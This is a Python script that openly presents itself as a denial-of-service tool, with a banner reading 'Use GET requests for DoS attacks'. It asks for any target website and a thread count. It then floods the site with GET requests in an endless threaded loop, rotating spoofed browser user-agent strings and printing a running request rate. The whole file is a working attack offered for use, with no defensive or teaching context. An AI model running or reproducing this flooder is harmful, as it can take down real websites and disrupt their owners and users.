import requests
import threading
import random
import time
import multiprocessing

# Function to send GET request with a random user-agent
def send_request(url, request_count):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/71.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/88.0.705.74",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/64.0.3417.92",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) IE/11.0.9600.18349",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 OPR/56.0.3051.52",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 Edg/88.0.705.63",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/85.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/98.0.1108.62",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/102.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 OPR/110.0.7891.64",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4778.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/103.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/103.0.1116.50"
    ]

    headers = {'User-Agent': random.choice(user_agents)}

    try:
        response = requests.get(url, headers=headers)
        request_count[0] += 1
        elapsed_time = time.time() - start_time
        if elapsed_time > 0:
            avg_rpm = request_count[0] / (elapsed_time / (60/60))
        else:
            avg_rpm = 0
        print(f"Request {request_count[0]} - Status Code: {response.status_code} - Average RPS: {avg_rpm:.2f}")
    except Exception as e:
        print(f"Error: {e}")
print("""
╔╗╔╗╔╗──╔╗
║║║║║║──║║
║║║║║╠══╣╚═╗╔══╦══╦╦══╦══╦═╗
║╚╝╚╝║║═╣╔╗║║╔╗║╔╗╠╣══╣╔╗║╔╗╗
╚╗╔╗╔╣║═╣╚╝║║╚╝║╚╝║╠══║╚╝║║║║
─╚╝╚╝╚══╩══╝║╔═╩══╩╩══╩══╩╝╚╝
────────────║║
────────────╚╝""")
print("Use GET requests for DoS attacks")

# Get the website link from the user
print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣴⡾⠃⠀⠀⠀⠀⠈⠳⣦⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡾⠋⠁⠀⠀⠀⢀⣤⣤⣤⣤⣄⡀⠀⠀⠀⠉⠻⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⢀⣿⡿⠛⢿⣿⠟⠻⣿⣷⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠈⠻⣷⣤⣾⢻⣤⣴⡿⠋⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠈⢿⣇⣈⣿⠟⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣤⣤⣭⣤⣤⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⢸⣿⣶⣤⣄⣈⠉⠉⠉⠁⠤⣶⣾⣿⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⢀⣤⣀⣉⡉⠙⠛⠿⠶⣶⣦⣤⣤⣀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠸⠟⠋⠉⠀⠀⠀⠀⠀⠀⠈⠙⠛⠟⠀⢀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡾⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀""")
website_link = input("Enter the website link: ")

num_cpu_threads = multiprocessing.cpu_count()
print(f"Detected {num_cpu_threads} CPU cores.")
# Number of threads
num_threads = int(input("how many threads would you like to use: "))  # You can adjust this value

# Create and start multiple threads
threads = []
request_count = [0]  # Counter for request tracking
start_time = time.time()
while True:
    if len(threads) < num_threads:
        thread = threading.Thread(target=send_request, args=(website_link, request_count))
        thread.start()
        threads.append(thread)
    else:
        # Remove completed threads
        threads = [thread for thread in threads if thread.is_alive()]

print("Script running indefinitely. Use Ctrl+C to stop.")